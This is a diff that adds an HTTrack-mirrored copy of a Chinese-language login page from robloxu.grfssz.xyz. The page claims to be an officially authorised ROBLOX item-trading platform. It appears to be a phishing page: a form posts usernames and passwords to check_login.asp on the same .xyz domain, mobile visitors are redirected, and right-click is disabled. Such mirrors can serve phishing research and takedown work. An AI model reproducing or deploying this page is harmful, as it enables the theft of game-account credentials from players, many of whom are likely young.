@@ -1,0 +1,402 @@
+
+
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from robloxu.grfssz.xyz/login.asp by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 16 Jan 2025 21:44:36 GMT -->
+<head>
+    
+    <title>會員登陸－ROBLOX實物交易網-官方授權全球遊戲線上交易平臺</title>
+    <link type="text/css" rel="stylesheet" href="nyyh/base-min.css">
+    <meta http-equiv="Content-Type" content="text/html; charset=gb2312" />    <script type='text/javascript' src="nyyh/seed-min.js" data-config="{combine:true}"></script>
+    <style>
+        * {
+            padding: 0px;
+            margin: 0px;
+        }
+
+        body {
+            font-size: 12px;
+            line-height: 25px;
+            text-align: left;
+            font-family: "宋體";
+            min-width: 960px;
+        }
+
+        li, ul, ol, dl {
+            list-style: none;
+        }
+
+        img {
+            border: 0px;
+        }
+
+        a {
+            text-decoration: none;
+        }
+
+        .loading {
+            width: 100%;
+            max-width: 1920px;
+            margin: 0 auto;
+            position: relative;
+            height: 500px;
+        }
+
+        .yy {
+            width: 100%;
+            height: 500px;
+            position: relative;
+            z-index: 1;
+            overflow: hidden;
+            margin: 0 auto;
+            background: #fdda17;
+        }
+
+        .qq {
+            width: 200%;
+            height: 500px;
+            left: -50%;
+            top: 0;
+            position: absolute;
+        }
+
+        .ks-switchable-content {
+            width: 1920px;
+            height: 500px;
+            margin: 0 auto;
+        }
+
+            .ks-switchable-content li {
+                display: block;
+                width: 1920px;
+                height: 500px;
+                position: absolute;
+                z-index: 1;
+              
+            }
+
+            .ks-switchable-content img {
+                display: block;
+                width: 1920px;
+                height: 500px;
+            }
+
+        .ks-switchable-nav {
+            width: 960px;
+            margin: 0 auto;
+            height: 30px;
+            overflow: hidden;
+            display: block;
+            filter: alpha(opacity=70);
+            filter: progid:DXImageTransform.Microsoft.Alpha(opacity=70);
+            opacity: 0.70;
+            position: relative;
+            margin-top: -30px;
+            z-index: 9;
+        }
+
+            .ks-switchable-nav li {
+                line-height: 30px;
+                text-align: center;
+                width: 237.5px;
+                height: 30px;
+                background: #868686;
+                float: left;
+                margin-left: 2px;
+                font-size: 12px;
+                cursor: pointer;
+            }
+
+                .ks-switchable-nav li.ks-active {
+                    background: #fff;
+                }
+
+        li, ul, ol, dl {
+            list-style: none;
+        }
+
+        li, select, textarea, input {
+            vertical-align: middle;
+        }
+
+        a {
+            text-decoration: none;
+            color: #666;
+        }
+
+            a:hover {
+                text-decoration: underline;
+                color: #333;
+            }
+
+        .mind_cont {
+            position: absolute;
+            z-index: 99999;
+            left: 61%;
+            top: 70px;
+            color: #666;
+            width: 250px;
+            height: auto;
+            padding: 20px;
+            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ddd;
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #ddd;
+            border-radius: 5px;
+            background: #fff;
+        }
+
+        .load_butten {
+            width: 250px;
+            height: 25px;
+            background: #8CBE56;
+            color: #fff;
+            font-size: 14px;
+            font-weight: bold;
+            text-align: center;
+            cursor: pointer;
+            border-radius: 2px;
+            border: 1px solid #6CBE56;
+            margin-top: 10px;
+            margin-bottom: 5px;
+        }
+
+        .load_butte {
+            background: #89C964;
+            border: 1px solid #7CBE56;
+        }
+
+        #err {
+            height: 25px;
+            border: 1px solid #FF8080;
+            background: url(nyyh/stuff.png) -319px -449px #efefef;
+            color: red;
+            text-align: center;
+            line-height: 25px;
+            filter: alpha(opacity=60);
+            filter: progid:DXImageTransform.Microsoft.Alpha(opacity=60);
+            opacity: 0.60;
+            margin-top: 10px;
+            border-radius: 2px;
+            display: none;
+        }
+
+        input {
+            margin: 0;
+            color: #666;
+            width: 238px;
+            outline: none;
+            border-radius: 2px;
+            border: 1px solid #ddd;
+            height: 15px;
+            line-height: 15px;
+            padding: 5px;
+        }
+
+        .input_on {
+            height: 15px;
+            line-height: 15px;
+            background: #efefef;
+            border-color: #89C964;
+            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #89C964;
+            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075), 0 0 6px #89C964;
+            filter: alpha(opacity=90);
+            filter: progid:DXImageTransform.Microsoft.Alpha(opacity=90);
+            opacity: 0.90;
+        }
+
+        .input_off {
+            border: 1px solid #ddd;
+            height: 15px;
+            line-height: 15px;
+            filter: alpha(opacity=70);
+            filter: progid:DXImageTransform.Microsoft.Alpha(opacity=70);
+            opacity: 0.70;
+        }
+
+        .mind_cont p {
+            margin: 0px;
+            color: #666;
+        }
+
+        .logoCn {
+            overflow: hidden;
+            margin-top: 16px;
+        }
+
+            .logoCn li {
+                float: left;
+                padding: 0 10px;
+                border-right: 1px solid #e4e4e4;
+            }
+
+                .logoCn li a {
+                    display: block;
+                    height: 20px;
+                }
+
+            .logoCn .qqLogo {
+                background-image: url(nyyh/qqlogo.gif);
+                background-position: left;
+                background-repeat: no-repeat;
+                padding-left: 24px;
+                line-height: 20px;
+            }
+
+            .logoCn .zhifubaoLogo {
+                background-image: url(nyyh/zhifubao.gif);
+                background-position: left;
+                background-repeat: no-repeat;
+                padding-left: 24px;
+                line-height: 20px;
+            }
+
+            .logoCn .weiboLogo {
+                background-image: url(nyyh/weibo.gif);
+                background-position: left;
+                background-repeat: no-repeat;
+                padding-left: 24px;
+                line-height: 20px;
+            }
+
+        .theThird {
+            margin-top: 4px;
+        }
+    </style>
+  <SCRIPT LANGUAGE="JavaScript">
+ function mobile_device_detect(url)
+ {
+        var thisOS=navigator.platform;
+		 
+        var os=new Array("iPhone","iPod","iPad","android","Nokia","SymbianOS","Symbian","Windows Phone","Phone","Linux armv71","MAUI","UNTRUSTED/1.0","Windows CE","BlackBerry","IEMobile");
+ for(var i=0;i<os.length;i++)
+        {
+ if(thisOS.match(os[i]))
+        {  
+  window.location=url;
+ }
+          
+ }
+ //因為相當部分的手機繫統不知道信息,這裏是做臨時性特殊辨認
+ if(navigator.platform.indexOf('iPad') != -1)
+        {
+  window.location=url;
+ }
+ //做這一部分是因為Android手機的內核也是Linux
+ //但是navigator.platform顯示信息不盡相同情況繁多,因此從瀏覽器下手，即用navigator.appVersion信息做判斷
+  var check = navigator.appVersion;
+  if( check.match(/linux/i) )
+          {
+   //X11是UC瀏覽器的平臺 ，如果有其他特殊瀏覽器也可以附加上條件
+   if(check.match(/mobile/i) || check.match(/X11/i))
+                 {
+   window.location=url;
+   } 
+ }
+ //類in_array函數
+ Array.prototype.in_array = function(e)
+ {
+  for(i=0;i<this.length;i++)
+  {
+   if(this[i] == e)
+   return true;
+  }
+  return false;
+ }
+ }
+mobile_device_detect("wap/login.html");
+</SCRIPT>
+</head>
+<body>
+    <div style="width: 960px; margin: 0 auto; padding-top: 10px">
+        <a href="index-2.html">
+            <img src="upfile/2024123012461090209.jpg" width="190px" /></a>
+    </div>
+    <div id="J_Slide" class="loading">
+        <div class="yy">
+            <div class="qq">
+                <ol class="ks-switchable-content">
+                    <li>
+                    
+                        <img src="nyyh/a1.jpg" alt="" /></li>
+                </ol>
+            </div>
+        </div>
+        <ul class="ks-switchable-nav">
+            <!-- 觸發器列錶 -->
+          
+        </ul>
+        <div class="loadSign">
+            <div class="load_mind"></div>
+            <div class="mind_cont">
+                <div id="err" class="err"></div>
+                <form method="post" action="https://robloxu.grfssz.xyz/check_login.asp" id="signin" onsubmit="return tijiao(this);">
+                    帳 號:<br />
+                    <input type="text" name="user_name" id="user_name" value="" onfocus="this.className='input_on'" onblur="this.className='input_off'" /><br />
+                    密 碼:<br />
+                    <input type="password" name="user_pwd" onfocus="this.className='input_on'" onblur="this.className='input_off'" id="user_pwd" /><br />
+                    驗 證 碼:<br />
+                    <input type="text" name="getcode" style="width:130px" onfocus="this.className='input_on'" onblur="this.className='input_off'" id="getcode" /><img src="getcode.bmp" style="height:20px; margin-left:10px;" /><br />
+
+                    <input type="submit" value="登 錄" class="button load_butten" />
+
+                    <input type="hidden" name="from" value="windex.html" />
+                </form>
+                <p>
+                    <!--<a href="javascript:;" onclick="return window.open(&#39;https://graph.qq.com/oauth2.0/authorize?client_id=100322708&amp;response_type=token&amp;scope=all&amp;redirect_uri=http%3A%2F%2Fwww.dong10.com%2Findex-qqlogin.html&#39;, &#39;oauth2Login_10160&#39; ,&#39;height=525,width=585, toolbar=no, menubar=no, scrollbars=no, status=no, location=yes, resizable=yes&#39;);">-->
+                    <a href="reg.html">立即註冊</a>丨<a href="#">忘記密碼？</a>
+                </p>
+                
+            </div>
+        </div>
+    </div>
+    <div style="margin: 0 auto; margin-top: 20px; text-align: center">
+        <span><a href="helpea25.html?id=24">關於我們</a></span><span>丨</span>
+        <span><a href="help9e43.html?id=25">合作聯繫</a></span><span>丨</span>
+        <span><a href="help3162.html?id=26">隱私保護</a></span><span>丨</span>
+        <span><a href="wendasave.html">咨詢建議</a></span><span>丨</span>
+        <span><a href="help3773.html?id=27">免費聲明</a></span>
+        
+    </div>
+    <script>
+		function chCaptcha(){
+		document.getElementById("captcha").src = "/captcha"+"?s="+Math.random();
+		}
+
+		function tijiao(who){
+		var r = true;
+		var tip = document.getElementById("err");
+		for (var i = 1; i < who.length; i++) {
+		if ('' == who[i].value) {
+		tip.innerHTML = "請填寫完整的登陸信息";
+		r = false;
+		break;
+		}
+		}
+		if(!r && "none" == tip.style.display) tip.style.display = "block";
+		return r;
+		}
+
+		KISSY.use("gallery/switchable/1.3.1/, event, dom", function (S, Switchable, Event, Dom){
+		new Switchable.Slide('#J_Slide', {
+		effect : 'fade',
+		easing : 'easeOutStrong'
+		});
+		Event.on('.load_butten','mouseenter mouseleave',function(e){
+		S.DOM.toggleClass(this,'load_butte');
+		});
+			
+			Dom.get("#password").focus();
+			
+		});
+    </script>
+</body>
+
+<body ondragstart="window.event.returnValue=false" oncontextmenu="window.event.returnValue=false">
+
+<!-- Mirrored from robloxu.grfssz.xyz/login.asp by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 16 Jan 2025 21:44:39 GMT -->
+</html>
+
+<head>
+<meta http-equiv="PRAGMA" content="NO-CACHE">
+
+</head>
